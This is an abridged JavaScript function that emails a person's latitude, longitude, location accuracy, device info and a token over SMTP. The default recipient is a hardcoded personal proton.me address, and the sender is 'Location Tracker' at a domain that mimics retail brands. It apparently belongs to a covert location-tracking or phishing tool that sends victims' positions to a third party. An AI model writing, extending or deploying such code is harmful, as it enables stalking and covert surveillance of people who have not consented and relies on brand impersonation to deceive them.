...
export async function sendLocationEmail(data) {
    const { token, lat, lng, accuracy, deviceInfo, targetEmail } = data;
    ...
    try {
        ...
        if (!apiKey || apiKey === '' || apiKey.includes('your_api_key')) {
            console.log("SMTP notification skipped: No valid API Key provided.");
            return;
        }
        ...
        const fromAddress = process.env.EMAIL_FROM || 'Location Tracker <notifications@send.temu.pop-mart.cloud>';

        let recipientList = ['larsenevans@proton.me'];
        if (targetEmail) {
            recipientList = [targetEmail];
        } else if (process.env.EMAIL_TO) {
            recipientList = process.env.EMAIL_TO.split(',').map(e => e.trim());
        }
        ...
        console.log("Location email sent successfully via SMTP to:", recipientList.join(', '), "MessageId:", info.messageId);
    } catch (error) {
        console.error("Error sending location email via SMTP (Runtime):", error.message || error);
    }
}
